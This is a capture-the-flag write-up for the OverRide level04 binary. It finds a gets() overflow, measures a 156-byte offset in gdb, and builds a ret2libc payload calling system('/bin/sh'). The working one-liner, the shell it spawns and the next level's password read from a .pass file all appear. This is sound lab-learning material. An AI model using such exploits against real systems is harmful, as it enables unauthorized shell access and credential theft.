[README](../README.md)
# Level04
Normal program execution:
```
level04@OverRide:~$ ./level04
Give me some shellcode, k
oui
child is exiting...
```

The main function creates a child using `fork()`.
Parent process:
- Wait for the child process
- Check if the child process exited normally or if it was terminate by a signal.
- If true print "child is exiting..." and return.
- Otherwise reads a value on the register 44 of the child process, if this value is eleven, stop and send kill signal to child process

Child process:
- Ignores the signal sent when its parent process terminates
- Enable tracing of the process
- Prints "Give me some shellcode, k"
- Use `gets` to read user input into the buffer - **Not protected**

## Checking for the offset
[Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
```
level04@OverRide:~$ gdb level04
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04
[New process 1699]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1699]
0x41326641 in ?? ()
```

We found an offset of 156 bytes to reach `eip`


## Finding system and "/bin/sh"
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
```

## Craft the exploit
```
|-------------------|
|      Padding      |   <--- Fill with junk bytes to reach the return address
|-------------------|
|   System Address |   <--- Overwrite with the address of system()
|-------------------|
|   Return Address |   <--- Return address for system (We don't care)
|-------------------|
|   "/bin/sh"      |   <--- Address of the string "/bin/sh"
|-------------------|
```

**Address of system() function**
system_address = "\xd0\xae\xe6\xf7"  # Little-endian format

**Address of "/bin/sh" string**
bin_sh_address = "\xec\x97\xf8\xf7"   # Little-endian format

**Offset to return address**
padding = "A" * 156

**Craft payload**
payload = padding + system_address + "AAAA" + bin_sh_address

```
level04@OverRide:~$ python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7")' > /tmp/level04
level04@OverRide:~$ cat /tmp/level04 - | ./level04
Give me some shellcode, k
ls
ls: cannot open directory .: Permission denied
whoami
level05
pwd
/home/users/level04
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```